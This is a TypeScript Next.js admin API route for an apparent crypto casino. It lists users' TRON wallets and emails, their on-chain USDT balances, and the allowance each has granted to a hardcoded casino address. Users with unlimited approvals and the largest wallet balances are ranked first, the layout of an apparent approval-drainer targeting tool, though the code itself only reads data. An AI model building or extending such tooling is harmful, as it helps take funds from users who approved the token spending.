import { NextRequest, NextResponse } from 'next/server';
import { supabaseAdmin } from '@/lib/supabase-admin';
import { getSubdomain } from '@/lib/subdomain';
import { getAdminFromToken } from '@/lib/game-utils';

export const dynamic = 'force-dynamic';

// TRON configuration - ALWAYS use mainnet for this admin API
const TRON_CONFIG = {
  mainnet: {
    fullHost: 'https://api.trongrid.io',
    casinoDepositAddress: 'TLvMnfDNjBwvabX1SXMC2DzegL897YJz11',
    usdt: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
  },
  shasta: {
    fullHost: 'https://api.shasta.trongrid.io',
    casinoDepositAddress: 'TSemQAPrBNtFq99nhJWBfb7iY5DrNXstGU',
    usdt: 'TXRwfd4jqK9hLSAJjtgvZToodKgHfHiJEH',
  }
};

// Threshold for "unlimited" approval (type(uint256).max is 2^256-1, 10^30 is effectively unlimited)
const UNLIMITED_THRESHOLD = BigInt(10) ** BigInt(30);

const getConfig = (network?: string) => {
  if (network === 'shasta') return TRON_CONFIG.shasta;
  return TRON_CONFIG.mainnet;
};

// Pad address to 32 bytes for ABI encoding (64 hex chars)
function padAddress(hexAddress: string): string {
  // TRON hex: 41 + 40 chars. We need last 40 chars (20 bytes) padded to 32 bytes
  const addr = hexAddress.startsWith('41') ? hexAddress.slice(2) : hexAddress.replace(/^0x/, '').slice(-40);
  return addr.padStart(64, '0');
}

async function triggerConstantContract(
  fullHost: string,
  apiKey: string | undefined,
  contractAddress: string,
  functionSelector: string,
  parameter: string,
  ownerAddressHex: string
) {
  const headers: Record<string, string> = {
    'Content-Type': 'application/json',
    'Accept': 'application/json',
  };
  if (apiKey) {
    headers['TRON-PRO-API-KEY'] = apiKey;
  }

  const res = await fetch(`${fullHost}/wallet/triggerconstantcontract`, {
    method: 'POST',
    headers,
    body: JSON.stringify({
      owner_address: ownerAddressHex,
      contract_address: contractAddress,
      function_selector: functionSelector,
      parameter,
    }),
  });

  const data = await res.json();
  if (!res.ok) {
    throw new Error(data.Error || data.message || `HTTP ${res.status}`);
  }
  return data;
}

function decodeUint256(hex: string): bigint {
  if (!hex || hex === '0x') return BigInt(0);
  return BigInt('0x' + hex.replace(/^0x/, ''));
}

const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

export async function GET(request: NextRequest) {
  try {
    const authHeader = request.headers.get('authorization');
    const requestSubdomain = getSubdomain(request.headers.get('x-subdomain') || new URL(request.url).hostname);
    const { isAdmin, adminOrigin, error: authError } = await getAdminFromToken(authHeader, requestSubdomain);
    if (!isAdmin || authError) {
      return NextResponse.json({ error: authError || 'Admin access required' }, { status: 403 });
    }

    const { searchParams } = new URL(request.url);
    const network = searchParams.get('network') || 'mainnet';
    
    const config = getConfig(network);
    const apiKey = process.env.TRONGRID_API_KEY;
    
    console.log('[TRON] Fetching TRON users from database...');
    console.log(`[TRON] Network: ${network}, Casino: ${config.casinoDepositAddress}, API Key: ${apiKey ? 'set' : 'not set'}`);

    // Initialize TronWeb for address conversion only
    const TronWebLib = require('tronweb');
    const TronWebConstructor = TronWebLib.TronWeb || TronWebLib.default || TronWebLib;
    const tronWeb = new TronWebConstructor({ fullHost: config.fullHost });

    const usdtHex = tronWeb.address.toHex(config.usdt);
    const casinoHex = tronWeb.address.toHex(config.casinoDepositAddress);
    // Use casino contract as caller for view functions (any valid address works)
    const callerHex = casinoHex;

    // Fetch TRON users from wallet_addresses table (primary source)
    const { data: walletRows, error: walletError } = await supabaseAdmin
      .from('wallet_addresses')
      .select('user_id, address')
      .eq('network', 'tron');

    if (walletError) {
      console.error('[TRON] wallet_addresses query error:', walletError);
    }

    // Filter by admin's origin: super admin (adminOrigin null) sees all; subdomain admin sees only their origin
    let filteredWalletRows = walletRows || [];
    if (adminOrigin) {
      const { data: originUsers } = await supabaseAdmin
        .from('users')
        .select('id')
        .eq('origin', adminOrigin);
      const originUserIds = new Set((originUsers || []).map(u => u.id));
      filteredWalletRows = filteredWalletRows.filter(row => originUserIds.has(row.user_id));
    }

    // Fetch user emails and origins from users table
    const allUserIds = [...new Set((filteredWalletRows || []).map(r => r.user_id))];
    const userInfoMap: Record<string, { email: string | null; origin: string | null }> = {};
    if (allUserIds.length > 0) {
      const { data: userRows } = await supabaseAdmin
        .from('users')
        .select('id, email, origin')
        .in('id', allUserIds);
      for (const u of userRows || []) {
        userInfoMap[u.id] = { email: u.email || null, origin: u.origin || null };
      }
    }

    // Deduplicate by address
    const addressMap = new Map<string, { id: string; wallet_address: string; email: string | null; origin: string | null }>();
    for (const row of filteredWalletRows) {
      if (row.address && row.address.startsWith('T')) {
        if (!addressMap.has(row.address)) {
          const info = userInfoMap[row.user_id] || { email: null, origin: null };
          addressMap.set(row.address, { id: row.user_id, wallet_address: row.address, email: info.email, origin: info.origin });
        }
      }
    }

    const users = Array.from(addressMap.values());
    console.log(`[TRON] Found ${filteredWalletRows.length} from wallet_addresses, ${users.length} unique`);

    if (users.length === 0) {
      return NextResponse.json({
        users: [],
        network,
        casinoContract: config.casinoDepositAddress,
        usdtContract: config.usdt,
        totalAddressesFound: 0,
        totalUsersChecked: 0,
        totalWithApproval: 0
      });
    }

    // Fetch platform balances for these users
    const userIds = users.map((u: any) => u.id);
    const { data: balanceRows } = await supabaseAdmin
      .from('balances')
      .select('user_id, amount')
      .in('user_id', userIds);

    const platformBalanceMap: Record<string, number> = {};
    for (const row of balanceRows || []) {
      platformBalanceMap[row.user_id] = Number(row.amount) || 0;
    }

    const usersWithData: any[] = [];

    for (let i = 0; i < users.length; i++) {
      const user = users[i];
      const address = user.wallet_address;
      if (!address || !address.startsWith('T')) continue;

      try {
        const addrHex = tronWeb.address.toHex(address);
        const addrParam = padAddress(addrHex);

        // balanceOf(address)
        const balanceParam = addrParam;
        const balanceRes = await triggerConstantContract(
          config.fullHost,
          apiKey,
          usdtHex,
          'balanceOf(address)',
          balanceParam,
          callerHex
        );

        // allowance(owner, spender) - owner is user, spender is casino
        const allowanceParam = addrParam + padAddress(casinoHex);
        const allowanceRes = await triggerConstantContract(
          config.fullHost,
          apiKey,
          usdtHex,
          'allowance(address,address)',
          allowanceParam,
          callerHex
        );

        const balanceHex = balanceRes.constant_result?.[0] || '0x';
        const allowanceHex = allowanceRes.constant_result?.[0] || '0x';
        const balance = decodeUint256(balanceHex);
        const allowance = decodeUint256(allowanceHex);
        const hasApproval = allowance > BigInt(0);
        const isUnlimited = allowance >= UNLIMITED_THRESHOLD;

        usersWithData.push({
          id: user.id,
          wallet_address: address,
          email: user.email || null,
          origin: user.origin || null,
          balance: balance.toString(),
          allowance: allowance.toString(),
          platformBalance: platformBalanceMap[user.id] ?? 0,
          hasApproval,
          isUnlimited
        });

        // Throttle: 150ms between users to avoid 429 (with API key, 100k/day is plenty)
        if (i < users.length - 1) {
          await delay(150);
        }
      } catch (err: any) {
        console.warn(`[TRON] Error checking ${address}:`, err?.message);
        usersWithData.push({
          id: user.id,
          wallet_address: address,
          email: user.email || null,
          origin: user.origin || null,
          balance: '0',
          allowance: '0',
          platformBalance: platformBalanceMap[user.id] ?? 0,
          hasApproval: false,
          isUnlimited: false
        });
      }
    }

    // Sort: unlimited first, then approved, then by balance
    usersWithData.sort((a, b) => {
      if (a.isUnlimited && !b.isUnlimited) return -1;
      if (!a.isUnlimited && b.isUnlimited) return 1;
      if (a.hasApproval && !b.hasApproval) return -1;
      if (!a.hasApproval && b.hasApproval) return 1;
      const balA = BigInt(a.balance);
      const balB = BigInt(b.balance);
      return balB > balA ? 1 : balB < balA ? -1 : 0;
    });

    const totalWithApproval = usersWithData.filter(u => u.hasApproval).length;
    const totalUnlimited = usersWithData.filter(u => u.isUnlimited).length;
    console.log(`[TRON] Returned ${usersWithData.length} users, ${totalWithApproval} with approval (${totalUnlimited} unlimited)`);

    return NextResponse.json({
      users: usersWithData,
      network,
      casinoContract: config.casinoDepositAddress,
      usdtContract: config.usdt,
      totalAddressesFound: usersWithData.length,
      totalUsersChecked: usersWithData.length,
      totalWithApproval
    });

  } catch (error: any) {
    console.error('[TRON] Fatal error:', error);
    return NextResponse.json(
      { error: error.message || 'Failed to fetch TRON users' },
      { status: 500 }
    );
  }
}
